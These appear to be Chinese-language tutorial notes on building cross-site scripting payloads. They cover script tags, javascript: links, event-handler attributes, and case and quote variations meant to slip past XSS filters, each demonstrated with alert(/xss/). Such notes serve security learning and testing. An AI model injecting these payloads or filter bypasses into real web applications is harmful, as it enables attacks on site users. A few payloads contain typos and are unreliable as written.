#### xss构造

1. 利用<>构造HTML标签和JS<script>标签

    提交<script>alert(/xss/)</script>，触发xss攻击

2. 使用JavaScript以为协议方式构造xss

    javascript:alert(/xss/)

    <a href="javascript:alert(/xss/)">touch me!</a>

3. 产生的事件

    网页中会发生很多事件，JS可以对这些事件进行响应，可以通过事件触发JS函数，触发XSS

    1. windows事件，对windows对象触发的事件

    2. form事件，HTML表单的动作触发事件

    3. keyboard事件，键盘按键

    4. mouse事件，鼠标或类似用户动作触发的事件

    5. meida事件，由多媒体触发的事件

        鼠标悬停图片触发XSS：<img src='./smile.jpg' onmouseover='alert(/xss/)'>

        点击键盘任意按键触发XSS：<input type="text" onkeydown="alert(/xss/)">

        <input type="text" onkeyup="alert(/xss/)">

        <input type="button" onclick="alert(/xss/)">

    6. 其他标签和手法

        [ <svg onload="alert"(/xss/)"> ]

        [ <input onfocus=alert(/xss/) autofucus>]

        

#### XSS的变形

通过构造xss代码进行各种变形，以绕过xss过滤器的检测

1. 大小写转换，将payload进行大小写转化，如：

    <Img sRc='#' Onerror="alert(/xss/)" />

    [ <a hERf="javaScript:alert(/xss/)">click me</a> ]

2. 引号的使用，HTML对引号的使用不敏感，但是某些过滤函数比较严格

    <img src="#" onerror="alert(/xss/)"/>

    